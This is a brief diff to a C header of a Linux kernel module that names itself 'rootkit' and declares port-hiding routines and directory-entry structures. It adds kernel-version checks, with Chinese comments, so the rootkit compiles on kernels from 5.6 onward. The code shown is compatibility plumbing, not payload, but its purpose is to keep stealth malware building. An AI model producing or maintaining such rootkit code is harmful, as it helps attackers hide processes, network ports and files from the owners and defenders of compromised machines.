@@ -32,11 +32,15 @@
 #include <linux/signal.h>
 #include <linux/sched.h>
 #include <linux/pid.h>
-#include <linux/dirent.h>
 #include <linux/socket.h>
 #include <linux/in.h>
 #include <linux/net.h>
 #include <net/sock.h>
+
+// 条件包含dirent.h以避免重复定义
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
+#include <linux/dirent.h>
+#endif
 
 // 通用定义
 #define MODULE_NAME "rootkit"
@@ -70,6 +74,8 @@ extern int init_port_hiding(void);
 extern void cleanup_port_hiding(void);
 
 // 通用数据结构
+// 只在内核版本小于5.6时定义linux_dirent64结构体
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 struct linux_dirent64 {
     u64 d_ino;
     s64 d_off;
@@ -77,6 +83,7 @@ struct linux_dirent64 {
     unsigned char d_type;
     char d_name[];
 };
+#endif
 
 struct linux_dirent {
     unsigned long d_ino;
